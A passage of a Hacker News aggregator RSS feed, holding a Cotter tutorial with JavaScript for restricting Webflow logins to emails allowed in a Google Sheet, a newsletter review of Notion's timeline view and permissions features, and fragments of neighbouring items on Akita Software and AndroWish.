href="https://www.linkedin.com/in/jean-yang-96575030/">LinkedIn</a>; <a href="https://twitter.com/jeanqasaur">Twitter</a>)<br>Founder and CEO, Akita Software</p><p>P.S. Thank you to the veterans out there!<br>P.P.S. Follow our updates and tell us what you think on Twitter <a href="https://twitter.com/AkitaSoftware">@AkitaSoftware</a>!</p></div></div></div>]]>
            </description>
            <link>https://www.akitasoftware.com/blog/2020/11/10/kbgnmpu9bdi6qsgkkxo1amqptellna</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061745</guid>
            <pubDate>Wed, 11 Nov 2020 19:12:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Cotter – Restrict Login to “Allowed” Emails Only, No Code]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25061724">thread link</a>) | @mmarcelline
<br/>
November 11, 2020 | https://blog.cotter.app/how-to-restrict-your-webflow-website-to-allowed-emails-only/ | <a href="https://web.archive.org/web/*/https://blog.cotter.app/how-to-restrict-your-webflow-website-to-allowed-emails-only/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<div>
<figure><iframe width="480" height="270" src="https://www.youtube.com/embed/w9kJyBDcm9w?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h3 id="prerequisites">Prerequisites</h3><p>Before we begin, make sure you have done the following:</p><ul><li><strong>Follow Cotter's Basic Webflow Tutorial</strong>: <a href="https://blog.cotter.app/integrate-cotter-magic-link-to-webflow-in-less-than-15-minutes/">How to Integrate Cotter's Magic Link to Your Webflow Site in Less Than 7 minutes</a></li></ul><h3 id="how-it-works">How it works</h3><p>We'll have 3 pages in this tutorial: <strong>A Waitlist Page (/waitlist), a Login Page (/), and a Protected Page (/protected)</strong>. </p><p>Users can sign up to the waitlist by entering their email on the Waitlist Page. You can manage people on the waitlist in your Google Sheets. Only people who are marked as <code>Allowed: TRUE</code> on the waitlist can login to your website using the Login Page and access the Protected Page.</p><p>In this tutorial,<strong> we'll make the Waitlist Page, </strong>and then<strong> update the Login and Protected Page </strong>that you have made in the prerequisite tutorial<strong>.</strong></p><h2 id="make-a-waitlist-page">Make a Waitlist Page</h2><h3 id="step-1-set-up-google-sheets">Step 1: Set up Google Sheets</h3><p>Go to <a href="https://cotteremaillist.herokuapp.com/">https://cotteremaillist.herokuapp.com</a> to connect your Google Sheets that contains a list of emails and follow the instructions there. See an <a href="https://docs.google.com/spreadsheets/d/1EYaErpQUCOhfXgCb0vhObEwDMFBqi_-gmRJ8C7DcOAA/edit?usp=sharing">example Google Sheet here.</a> (You can make this sheet private - you just need to connect your Google Account in the website above).</p><h3 id="step-2-make-elements-to-show-the-waitlist-email-form-and-a-success-message">Step 2: Make elements to show the waitlist email form and a success message</h3><ul><li>Include a section element to load Cotter's login form. <strong>We need to set that section id "cotter-form-container"</strong>.<strong> </strong>Make the section <strong>width </strong>and<strong> height </strong>to<strong> <code>300px</code> </strong>for best results.</li><li>Include a text element with <strong>id "waitlist-message"</strong>. We will show if the email is successfully added to the waitlist here.</li></ul><h3 id="step-3-add-cotter-js-sdk">Step 3: Add Cotter JS SDK</h3><p>After finishing the page setup we can start with adding custom code to the Waitlist Page. Copy paste the code below to the custom code tab on the Waitlist Page settings.</p><figure><img src="https://blog.cotter.app/content/images/2020/11/image-4.png"><figcaption>Waitlist Page Settings</figcaption></figure><figure><img src="https://blog.cotter.app/content/images/2020/11/image-5.png"><figcaption>Scroll Down to "Custom Code" section</figcaption></figure><p>Add the code below to the <strong>head</strong> of Waitlist page:</p><pre><code>&lt;!--Get Cotter JS SDK--&gt;
&lt;script
  src="https://unpkg.com/<a href="https://blog.cotter.app/cdn-cgi/l/email-protection" data-cfemail="ff9c908b8b9a8dbfcfd1ccd1cdcc">[email&nbsp;protected]</a>/dist/cotter.min.js"
  type="text/javascript"
&gt;&lt;/script&gt;</code></pre><h3 id="step-4-add-a-function-to-insert-email-to-your-google-sheets">Step 4: Add a function to insert email to your Google Sheets</h3><p>Make sure you have already done Step 1 by going to <a href="https://cotteremaillist.herokuapp.com/">https://cotteremaillist.herokuapp.com</a> and connecting your Google Sheets that contains the waitlist (this can be empty, but make sure you follow the format specified).</p><p>Add the code below to the <strong>body</strong> of Waitlist page:</p><pre><code>&lt;script&gt;
  const insertEmail = async (payload) =&gt; {
    try {
      const body = {
        spreadsheetId: "&lt;YOUR SPREADSHEET ID&gt;", //👈 Add your Spreadsheet ID
        apiKeyID: "&lt;YOUR API KEY ID&gt;", //👈 Add your API KEY ID
        email: payload.email,
        allowed: false // By default, new emails are not allowed to login
      };
      let resp = await fetch(
        "https://cotteremaillist.herokuapp.com/api/insertemail",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(body)
        }
      );
      let respBody = await resp.json();
      if (respBody.success) {
        document.getElementById("waitlist-message").innerHTML =
          "Added to waitlist";
      } else {
        document.getElementById("waitlist-message").innerHTML =
          "Something went wrong";
      }
    } catch (e) {
      document.getElementById("waitlist-message").innerHTML =
        "Something went wrong";
    }
  };
&lt;/script&gt;</code></pre><p>Make sure that you have pasted your<strong> <u>Spreadsheet ID</u> </strong>and your<strong> <u>API Key ID</u> </strong>on the code block above.</p><p>You can grab a Cotter API Key ID by visiting <a href="https://dev.cotter.app/">https://dev.cotter.app</a> and creating an account. Once you have created an account, make sure to create a new project and grab the API Key ID.</p><h3 id="step-5-add-the-code-below-to-show-the-email-form-join-waitlist-form-">Step 5: Add the code below to show the email form ("Join Waitlist" form)</h3><p>Below the code on step 4, add this code:</p><pre><code>&lt;script&gt;
    var cotter = new Cotter({
      ApiKeyID: "&lt;YOUR_API_KEY_ID&gt;",  // 👈 Specify your API KEY ID here
      ButtonText: "Join Waitlist",
    });
    cotter
      .signInWithLink() // Verify email with Magic Link
      .showEmailForm() // Send Magic Link via email
      .then((payload) =&gt; {
        insertEmail(payload);
      })
      .catch((err) =&gt; {
      // handle error
      });
&lt;/script&gt;</code></pre><p>Make sure that you have pasted your<strong> <u>API Key ID</u> </strong>on the code block above.</p><h2 id="login-page-setup-where-the-login-form-will-show-up-">Login Page Setup (where the login form will show up)</h2><p>You should already have a Login Page after following the prerequisite tutorial above. Only users who are allowed in your Google Sheets can login. We are going to modify and add some of the necessary code.</p><h3 id="step-1-add-the-code-below-to-the-body-of-the-login-page">Step 1. Add the code below to the body of the Login Page</h3><p>Add this code before you Initialize Cotter</p><pre><code>&lt;script&gt;
  const checkEmail = async (payload) =&gt; {
    try {
      const body = {
        spreadsheetId: "&lt;YOUR SPREADSHEET ID&gt;", //👈 Add your Spreadsheet ID
        apiKeyID: "&lt;YOUR API KEY ID&gt;",  // 👈 Specify your API KEY ID here
        email: payload.identifier
      };
      let resp = await fetch(
        "https://cotteremaillist.herokuapp.com/api/checkemail",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(body)
        }
      );
      let respBody = await resp.json();
      if (!respBody.allowed) {
        return "You are not allowed to log in";
      } else {
        return null;
      }
    } catch (e) {
      console.log(e);
      return "You are not allowed to log in";
    }
  };
&lt;/script&gt;</code></pre><p><strong>Make sure that you have pasted your <u>Spreadsheet ID</u> and your <u>API Key ID</u> on the code block above.</strong></p><h3 id="step-2-change-the-code-in-the-body-of-the-login-page-to-the-code-below">Step 2. Change the code in the body of the Login Page to the code below</h3><pre><code>&lt;script&gt;
  var cotter = new Cotter("&lt;YOUR_API_KEY_ID&gt;"); // 👈 Specify your API KEY ID
  cotter
    // Choose what method of login do you want
    // Sign In with Magic Link
-   .signInWithLink()
+   .signInWithLink(checkEmail)
    // Send Magic Link via email
    .showEmailForm()
    
    .then(payload =&gt; {
      // redirect to the protected page
      window.location.href = "/protected";
    })
    .catch(err =&gt; {
      // handle error
    });
 &lt;/script&gt;</code></pre><p>Make sure you deleted the line ".signInWithLink()" and added the line ".signInWithLink(checkEmail)".</p><p>Also, make sure that you have pasted your <u>API Key ID</u> on the code block above.</p><h2 id="protected-page-setup-and-any-other-page-you-want-to-protect-">Protected Page Setup (and any other page you want to protect)</h2><p>You should already have a Protected Page after following the prerequisite tutorial above. We are going to modify and add some of the necessary code.</p><pre><code>&lt;script
  src="https://unpkg.com/<a href="https://blog.cotter.app/cdn-cgi/l/email-protection" data-cfemail="8deee2f9f9e8ffcdbda3bea3bfbe">[email&nbsp;protected]</a>/dist/cotter.min.js"
  type="text/javascript"
&gt;&lt;/script&gt;

&lt;script&gt;
  async function checkLoggedIn() {
    //Initialize Cotter
    var cotter = new Cotter("&lt;YOUR_API_KEY_ID&gt;"); // 👈 Specify your API KEY ID
    
    // 1. We check if a user has already logged in
    const accessTokenObject = await cotter.tokenHandler.getAccessToken();
    const accessToken = accessTokenObject ? accessTokenObject.token : null;

    // 2. If user is not logged in then we redirect to the login page
    if (!accessToken) window.location.href = "/";

    // 3. Construct the body for access token verification
    let body = {
      oauth_token: {
        access_token: accessToken
-     } 
+     },
+     spreadsheetId: "&lt;YOUR SPREADSHEET ID&gt;",  //👈 Add your Spreadsheet ID
+     apiKeyID: "&lt;YOUR API KEY ID&gt;" // 👈 Specify your API KEY ID here
    };

    // 4. If user is logged in then we fetch the user data
+   //    and check if the email is allowed based on our Google sheets
-   let url = "https://worker.cotter.app/verify";
+   let url = "https://cotteremaillist.herokuapp.com/api/login"
    fetch(url, {
      method: "POST",
      cache: "no-cache",
      headers: {
        "Content-Type": "application/json",
-        API_KEY_ID: "&lt;YOUR_API_KEY_ID&gt;"   // 👈 Specify your API KEY ID here
      },
-     mode: "cors",
      body: JSON.stringify(body)
    })
      .then((resp) =&gt; resp.json())
      .then((data) =&gt; {
        if (!data.success) { window.location.href = "/" }
      });
  }
  
  //Call the CheckLoggedIn function
  checkLoggedIn();
  
&lt;/script&gt;</code></pre><p><strong>Make sure you delete all lines with the "-" symbol and added all lines with the "+" symbol.</strong> (Do not include the <code>+</code> sign itself).</p><p>Also, make sure that you have pasted your <u>Spreadsheet ID</u> and your <u>API Key ID</u> on the code block above.</p><hr><h3 id="questions-feedback">Questions &amp; Feedback</h3><p>Come and talk to the founders of Cotter and other developers who are using Cotter on <a href="https://join.slack.com/t/askcotter/shared_invite/zt-dxzf311g-5Mp3~odZNB2DwYaxIJ1dJA">Cotter's Slack Channel</a>.</p><h3 id="ready-to-use-cotter">Ready to use Cotter?</h3><p>If you enjoyed this tutorial and want to integrate Cotter into your website or app, you can <a href="https://dev.cotter.app/">create a free account</a> and <a href="https://docs.cotter.app/">check out our documentation</a>.</p><p>If you need help, ping us on our <a href="https://join.slack.com/t/askcotter/shared_invite/zt-dxzf311g-5Mp3~odZNB2DwYaxIJ1dJA">Slack channel</a> or email us at <a href="https://blog.cotter.app/cdn-cgi/l/email-protection" data-cfemail="a2d6c7c3cfe2c1cdd6d6c7d08cc3d2d28c">[email&nbsp;protected]</a></p>
</div>
</section></div>]]>
            </description>
            <link>https://blog.cotter.app/how-to-restrict-your-webflow-website-to-allowed-emails-only/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061724</guid>
            <pubDate>Wed, 11 Nov 2020 19:11:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gantt Charts Arrive in Notion]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25061649">thread link</a>) | @saviorand
<br/>
November 11, 2020 | https://optemization.com/timeline-view-notion | <a href="https://web.archive.org/web/*/https://optemization.com/timeline-view-notion">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><article id="block-timeline-view-notion"><blockquote id="block-659ced01cffc486ca3fa1b6e01fb482d"><span><span>It's about time: gantt charts, page customization and more arrive to Notion —
here's our breakdown.</span></span></blockquote><div id="block-9ce0f17fa5904c5ba88176d78f03d8ff"><div id="block-f4c2486805a1467cb60c4a5aa1db40e5"><p><span><span>Hello there! Welcome to </span><span><em>Digital Opsessions</em></span><span> issue #0003</span></span></p></div></div><div id="block-e49dbd8e89f34444b7a9118c475aa629"><div id="block-2c66366dc9994fae8d874f1f30735471"><p><span><span>Today, marvelous talents at Notion decided to make it a bright Wednesday for us and share three major updates in the app! As part of the Notion Ambassadors group, we were fortunate enough to beta test these features and help spread the announcement news. </span></span></p><p><span><span>Here's what's up </span></span></p></div></div><div id="block-d85f6c16c65a4a098d6794d204a0267b"><div id="block-67d522c072b8469b8543221c3b19634a"><p><span><span>It has been a loooong dark 469 days since this Tweet has swept the world of project management. Frankly, it feels like the gap between season seven and season eight of the Game of Thrones. Only this time, you're going to be very happy. </span></span></p><p><span><span>Now that I think about it: Pfizer's vaccine announcement to COVID-19 is like Arya to the Night King (if you know what I mean — </span><span><span><span>no spoilers</span></span></span><span>). </span></span></p></div></div><h2 id="block-8854e6d47bc8427ba082691fcd7e95e6"><span id="8854e6d47bc8427ba082691fcd7e95e6"></span><span><span>How to Timeline View</span></span></h2><p><span><span>Starting today, you will see the timeline view option show up in all your databases and linked database views. This is how it looks like:</span></span></p><div id="block-cb36fbb3f3d742e59a7052a3434dc403"><picture><source srcset="https://api.super.so/asset/optemization.com/d9fb8f55-918d-4d1d-8f1a-b07973ad41e9.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/d9fb8f55-918d-4d1d-8f1a-b07973ad41e9.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/d9fb8f55-918d-4d1d-8f1a-b07973ad41e9.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/d9fb8f55-918d-4d1d-8f1a-b07973ad41e9.png?w=1500" alt="image" loading="lazy"></picture></div><p><span><span>Here are some main configuration options to be aware of.</span></span></p><h3 id="block-3a98d91ea0c7408b9d38b302d0a9cf96"><span id="3a98d91ea0c7408b9d38b302d0a9cf96"></span><span><span>Timeline by</span></span></h3><p><span><span>Just like with board and calendar views, you can choose what dates the Timeline view indexes by. </span></span></p><div id="block-056fc67a35f34ed38fe2deff5ea12a8b"><picture><source srcset="https://api.super.so/asset/optemization.com/77a66cc4-c069-4f8c-8a2a-066b925dad3b.gif?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/77a66cc4-c069-4f8c-8a2a-066b925dad3b.gif?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/77a66cc4-c069-4f8c-8a2a-066b925dad3b.gif?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/77a66cc4-c069-4f8c-8a2a-066b925dad3b.gif?w=1500" alt="image" loading="lazy"></picture></div><p><span><span>In our case, we're arranging our content calendar by two date properties. To do that, toggle the </span><span><code>use separate start and end dates</code></span><span> option. We also like to enter both start and end dates in one property, but needed filtered visibility in the view. 
So we added a two simple formula properties:</span></span></p><ol><li id="block-f89f02f1bac2425789e0f9ecddeee9f4"><span><span>Start date: </span><span><code>start(prop("Promotion Dates"))</code></span></span></li><li id="block-7861a869b8284263831a9a9b58104177"><span><span>End date </span><span><code>end(prop("Promotion Dates"))</code></span></span></li></ol><div id="block-afad72a4ccbe4f1580bd7a0f1f142601"><p><span><span>Note that the "timeline by" setting will </span><span><strong>not</strong></span><span> sort your records chronologically by default. You need to enable this option if you need it.</span></span></p></div><h3 id="block-afa3f89aff864e099417bc191809b611"><span id="afa3f89aff864e099417bc191809b611"></span><span><span>Show table </span></span></h3><p><span><span>For the first time in Notion databases-and-views history you can fully hide the table! That comes in handy with timeline view — if you just want to see that beautiful timeline. 
You'll also notice that you can limit the amount of records that show up without filtering, but more on that below</span></span></p><div id="block-2f1dc0d7047146d095c018880c646883"><picture><source srcset="https://api.super.so/asset/optemization.com/35e655b8-664c-4b96-8db3-239615ae3184.gif?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/35e655b8-664c-4b96-8db3-239615ae3184.gif?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/35e655b8-664c-4b96-8db3-239615ae3184.gif?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/35e655b8-664c-4b96-8db3-239615ae3184.gif?w=1500" alt="image" loading="lazy"></picture></div><h2 id="block-2f419ddfbd474c8e9744b4b41831f8f7"><span id="2f419ddfbd474c8e9744b4b41831f8f7"></span><span><span>The Good / The Bad</span></span></h2><div id="block-98a043c9f3d54cbfaf16507beddb2f56"><picture><source srcset="https://api.super.so/asset/optemization.com/a4e87755-cc22-423d-9d79-877a3650d6b7.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/a4e87755-cc22-423d-9d79-877a3650d6b7.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/a4e87755-cc22-423d-9d79-877a3650d6b7.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/a4e87755-cc22-423d-9d79-877a3650d6b7.png?w=1500" alt="image" loading="lazy"></picture></div><h3 id="block-3595a6e3558e48f9815ea8277e41a6dd"><span id="3595a6e3558e48f9815ea8277e41a6dd"></span><span><span>Things we love</span></span></h3><p><span><span><strong>Moving multiple date-specific records is seamless</strong></span><span>. Now, if you need to adjust a project timeline that has multiple pieces to it, whether its tasks, milestones, or events, you can just select them all, drag and all the dates will adjust accordingly. We use this, for example, to adjust whole complex project schedules to start from a given date — very handy!</span></span></p><div id="block-633f34747c1f45bb9bcd4b392939fe48"><picture><source srcset="https://api.super.so/asset/optemization.com/add5b1ab-14c2-485d-812f-809bf50c452f.gif?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/add5b1ab-14c2-485d-812f-809bf50c452f.gif?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/add5b1ab-14c2-485d-812f-809bf50c452f.gif?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/add5b1ab-14c2-485d-812f-809bf50c452f.gif?w=1500" alt="image" loading="lazy"></picture></div><p><span><span><strong>Hiding the property table is possible! </strong></span><span>If you'd like to see the timeline view in its full glory you can now toggle the table on and off. In the other Notion views, you cannot hide the main "Name" / ID property. </span></span></p><div id="block-50d1fed52f7c4101beb7d215660af070"><picture><source srcset="https://api.super.so/asset/optemization.com/9ba9dc57-2389-40b4-84ca-c93bdc43ab4a.gif?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/9ba9dc57-2389-40b4-84ca-c93bdc43ab4a.gif?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/9ba9dc57-2389-40b4-84ca-c93bdc43ab4a.gif?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/9ba9dc57-2389-40b4-84ca-c93bdc43ab4a.gif?w=1500" alt="image" loading="lazy"></picture></div><p><span><span><strong>You can timeline by separate properties. </strong></span><span>The default Notion date property does not allow filtering or sorting by the date range. It uses the start date. That can be tricky and annoying when you want to filter your timeline view. Luckily, you have the option to timeline by separate fields!</span></span></p><div id="block-e347aea8615f4fb68f3dd07579d1d4af"><picture><source srcset="https://api.super.so/asset/optemization.com/b681c448-961e-438f-98b3-4977ca6ee06f.gif?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/b681c448-961e-438f-98b3-4977ca6ee06f.gif?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/b681c448-961e-438f-98b3-4977ca6ee06f.gif?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/b681c448-961e-438f-98b3-4977ca6ee06f.gif?w=1500" alt="image" loading="lazy"></picture></div><h3 id="block-b01c6b44c6eb42b8a0e4d062c85b586f"><span id="b01c6b44c6eb42b8a0e4d062c85b586f"></span><span><span>Things we hate</span></span></h3><p><span><span><strong>Data overflow: </strong></span><span>Items look bad when you show more than one property in the timeline, or when an event takes place on a single day (then item is just a small white dot, and text overflows). When more than a few properties toggled on the timeline, the UI of each becomes visible cluttered. For both the table and timeline, a "wrap cells" options would be great.</span></span></p><div id="block-b126bbb5b6e546db81fe1c95982de683"><picture><source srcset="https://api.super.so/asset/optemization.com/875b03db-e9f6-4958-bbf0-a9942da504af.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/875b03db-e9f6-4958-bbf0-a9942da504af.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/875b03db-e9f6-4958-bbf0-a9942da504af.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/875b03db-e9f6-4958-bbf0-a9942da504af.png?w=1500" alt="image" loading="lazy"></picture></div><p><span><span><strong>Only full width. C</strong></span><span>urrently timelines with a table toggles "on", do not adjust to standard width.That's annoying because for some it might be useful to see the table and timeline on the standard width.</span></span></p><div id="block-9c638003ac144730b036479a2d56bf6c"><picture><source srcset="https://api.super.so/asset/optemization.com/b0d2431d-bdc3-4125-9edd-17549894a669.gif?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/b0d2431d-bdc3-4125-9edd-17549894a669.gif?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/b0d2431d-bdc3-4125-9edd-17549894a669.gif?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/b0d2431d-bdc3-4125-9edd-17549894a669.gif?w=1500" alt="image" loading="lazy"></picture></div><p><span><span><strong>Paid plans limits</strong></span></span></p><div id="block-4058fc818edf482ab647cb0d6a4790ba"><div id="block-6c4afe4fb0934ecba8c9d341c6e955e9"><div id="block-6fc04eb8d9bf427c81b524a58a270ae5"><picture><source srcset="https://api.super.so/asset/optemization.com/9322832a-461e-4806-bc46-4be82e9cfd4e.png?w=434&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/9322832a-461e-4806-bc46-4be82e9cfd4e.png?w=434" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/9322832a-461e-4806-bc46-4be82e9cfd4e.png?w=434&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/9322832a-461e-4806-bc46-4be82e9cfd4e.png?w=434" alt="image" loading="lazy"></picture></div></div><div id="block-ad57120d749247d08823002a95441e09"><p><span><span>With the introduction of Timelines, Notion team added a new pricing tweak — a limit on the number of Timelines you can use. You can only add 3 timelines on a Personal plan and up to 5 on Team plan. For unlimited timelines you have to buy Enterprise</span></span></p></div></div><p><span><span>We managed to lay our hands on the Timeline view before the release, and had the chance to prepare this proposal template with a Gantt chart included!</span></span></p><p><span><span>It's easy to try — just duplicate it into your workspace and drag all milestones, meetings, deliverables and billing activities to your project's start date. Voila! You now have a complete, detailed project schedule aligned with your preferred dates.</span></span></p><p><span><span>You can change any part of this template — remove or add new records, change default structure, introduce new types of project activities, such as legal (marking the date when the contract is signed), holidays, events.</span></span></p><p><span><span>We use this template ourselves to spin up new client proposals — it saves tons of time on routine editing and allows us to focus on things that are essential, like pain points we help clients address, or our unique approach. </span></span></p><p><span><span>Making these kinds of documents in Notion is enjoyable — you can templatize pretty much any common structure. If the lack of Gantt Charts is something that was stopping you from going all-in on Notion, now is the time. </span></span></p><h2 id="block-3c4bd798e6b34e7abd3977fbe0825efb"><span id="3c4bd798e6b34e7abd3977fbe0825efb"></span><span><span>Get the template!</span></span></h2><h3 id="block-f851a8c9110c4392a445c1f5aa42fd57"><span id="f851a8c9110c4392a445c1f5aa42fd57"></span><span><span>Properties</span></span></h3><p><span><span>Power users know that complex. data-heavy workflows in Notion were tough to work with so far. When making structures that's more sophisticated than a simple "Basic CRM" workflow, properties tend to pile up — at some point, when opening a page, you don't see its content on the first screen, just properties.</span></span></p><p><span><span>Not anymore! Now you can hide properties you don't use and get straight to that page content every time you open a page. </span></span></p><div id="block-1fd0baefcc3d4939af7c1f0dcf418a19"><picture><source srcset="https://api.super.so/asset/optemization.com/52e79bf6-392b-4d85-911f-2660d3d4d596.png?w=406&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/52e79bf6-392b-4d85-911f-2660d3d4d596.png?w=406" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/52e79bf6-392b-4d85-911f-2660d3d4d596.png?w=406&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/52e79bf6-392b-4d85-911f-2660d3d4d596.png?w=406" alt="image" loading="lazy"></picture></div><p><span><span>The best part is that you can set up advanced rules on when to show or hide specific properties — for example, you can show a property only when it's not empty for the current page, or always hide a specific property on a page (you can always open it up manually).</span></span></p><div id="block-6b34b9caaab340d9a69316d845cee4cb"><picture><source srcset="https://api.super.so/asset/optemization.com/1d64c6a2-b8d3-4a5c-923f-f2bff59e5179.png?w=350&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/1d64c6a2-b8d3-4a5c-923f-f2bff59e5179.png?w=350" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/1d64c6a2-b8d3-4a5c-923f-f2bff59e5179.png?w=350&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/1d64c6a2-b8d3-4a5c-923f-f2bff59e5179.png?w=350" alt="image" loading="lazy"></picture></div><h3 id="block-e0e751d263f64ecc9596b3e091381dd9"><span id="e0e751d263f64ecc9596b3e091381dd9"></span><span><span>Comments, Backlinks</span></span></h3><p><span><span>It's simple with comments — you can just hide them for a page. Same with backlinks, but you can also select "Show in a popover". That option will display a small "X backlinks" button indicating how many backlinks a page has. Then you can press that button and view the backlinks.</span></span></p><div id="block-3e1f67ea498d4fa0ad79e33295222f8e"><picture><source srcset="https://api.super.so/asset/optemization.com/d7e691c5-25eb-433d-82a9-0d35f6b7fb0d.png?w=320&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/d7e691c5-25eb-433d-82a9-0d35f6b7fb0d.png?w=320" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/d7e691c5-25eb-433d-82a9-0d35f6b7fb0d.png?w=320&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/d7e691c5-25eb-433d-82a9-0d35f6b7fb0d.png?w=320" alt="image" loading="lazy"></picture></div><p><span><span>This functionality allows to keep any workspace clean, and the main use case is for large organizations managing tons of data. </span></span></p><p><span><span>Previously, when you shared access to a page with someone, they would automatically get access to all the subpages in it. Now when you open up a subpage you can see exactly what page it inherits permissions form — and then change permissions for this specific subpage.</span></span></p><div id="block-87a9344e6a4a4313aaa9430e7ef34cdc"><picture><source srcset="https://api.super.so/asset/optemization.com/af87fb42-e8d3-4377-b5e7-d7eab0996d37.png?w=620&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/af87fb42-e8d3-4377-b5e7-d7eab0996d37.png?w=620" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/af87fb42-e8d3-4377-b5e7-d7eab0996d37.png?w=620&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/af87fb42-e8d3-4377-b5e7-d7eab0996d37.png?w=620" alt="image" loading="lazy"></picture></div><p><span><span>This is useful when you have private pages that live inside a larger page — and you want to share the parent one without sharing these specific private pages. Think company's internal wiki with a subpage that contains sensitive data. </span></span></p><p><span><span>You can also add group permissions — Notion team mentions the use case of giving Engineering team access to most of the workspace except a couple read-only pages.</span></span></p><p><span><span>Notion will now show you a "Show X records" option when working with database settings — and will clip all the records above the number selected. Previously, if you had a huge database, it will display all the records in an infinite scroll as you move down the page — this might have been okay for small databases, but quickly got hard to manage with additional information load.</span></span></p><p><span><span>Timeline view, page customization, advanced permissions and row number limits — all of this seems to be targeting enterprise users, who need more control over large setups, Notion team is obviously hitting the nerve with big teams here. </span></span></p><p><span><span>Some features will also be handy for small teams and individual makers — authors can use the timeline view to manage their content editorial, freelancers can use it to control their work load. Advanced customization is valuable for anyone who keeps data in Notion.</span></span></p><div id="block-35eebc7612e34ff79f23e056bf85977e"><div id="block-ca65c34a263e4c7881ef4767fca59df4"><p><span><span>The </span><span><em>Digital Opsessions</em></span><span> newsletter helps you figure out how to use digital productivity systems, tools and habits to free up time, energy and focus </span><span><span>for more important or fun </span></span><span>things in life.</span></span></p><p><span><span><strong>Subscribe + share</strong></span><span> </span><span><span><span>(if you haven't already)</span></span></span><span> 👉</span></span></p></div></div></article></div></div></div>]]>
            </description>
            <link>https://optemization.com/timeline-view-notion</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061649</guid>
            <pubDate>Wed, 11 Nov 2020 19:05:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AndroWish – run desktop Tcl/Tk programs almost unaltered on the Android Platform]]>
            </title>
            <description>
<![CDATA[
Score 67 | Comments 20 (<a href="https://news.ycombinator.com/item?id=25061292">thread link</a>) | @jakobdabo
<br/>
November 11, 2020 | https://www.androwish.org/index.html/home | <a href="https://web.archive.org/web/*/https://www.androwish.org/index.html/home">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<tbody><tr><td>
<p>Tcl (Tool Command Language) is a very powerful but easy to learn dynamic programming language, suitable for a very wide range of uses, including web and desktop applications, networking, administration, testing and many more. Open source and business-friendly, Tcl is a mature yet evolving language that is truly cross platform, easily deployed and highly extensible.

